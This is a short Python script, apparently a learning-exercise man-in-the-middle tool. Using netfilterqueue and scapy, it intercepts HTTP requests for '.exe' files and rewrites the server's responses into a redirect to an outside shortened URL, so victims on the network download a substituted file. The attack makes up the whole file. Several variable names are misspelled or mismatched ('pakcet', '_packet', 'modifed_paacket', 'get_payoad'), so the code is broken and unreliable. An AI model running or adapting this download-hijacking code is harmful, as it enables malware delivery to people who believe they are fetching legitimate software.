import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(pakcet, load):
    packet[scapy.Raw].load = load
    #deleting everything that needs to be recalculated
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del _packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payoad())
    if scapy_packet.haslayer(scapy.Raw): #checking if packet has http layer
        if scapy_packet[scapy.TCP].dport == 80: #identifying request
            if ".exe" in scapy_packet[scapy.Raw].load: # checking if request has executable file
                print("[+] exe Reqeust")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80: #identifying response
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove( scapy_packet[scapy.TCP].seq)
                print ("[+] Replacing file...")
                modifed_paacket = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: http://tiny.cc/s1r97y\n\n")
                packet.set_payload(str(modified_packet))
            
                     
            
    packet.accept()

#creating netfilterqueue object to store packets coming from the server to modify them
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
